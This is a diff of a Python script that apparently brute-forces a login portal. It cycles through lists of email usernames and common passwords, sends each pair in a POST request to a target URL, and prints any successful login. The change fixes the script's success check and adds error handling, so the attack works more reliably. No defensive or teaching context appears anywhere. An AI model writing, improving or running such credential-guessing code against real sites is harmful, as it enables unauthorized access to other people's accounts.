@@ -158,7 +158,7 @@ import requests
 usernames = ['user1@gmail.com', 'user2@gmail.com', 'admin@gmail.com']
 passwords = ['password1', 'password2', '123456']
 
-# Target URL with a login portal
+# Target URL with a login portal (replace with the actual URL)
 login_url = input_url  # Replace with the actual URL
 
 # Session object to maintain the session cookies
@@ -173,13 +173,17 @@ for username in usernames:
             'password': password
         }
 
-        # Send a POST request to the login URL
-        response = session.post(login_url, data=login_data)
+        try:
+            # Send a POST request to the login URL
+            response = session.post(login_url, data=login_data)
+            response_text = response.text
 
-        # Check if the login was successful based on the response
-        if not 'Login Successful' in response.text:
-            print(f"Unsuccessful login - Username: {username}, Password: {password}")
-            break
+            # Check if the login was successful based on the response
+            if 'Login Successful' in response_text:
+                print(f"Successful login - Username: {username}, Password: {password}")
+                break
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {str(e)}")
 
 # Close the session
 session.close()
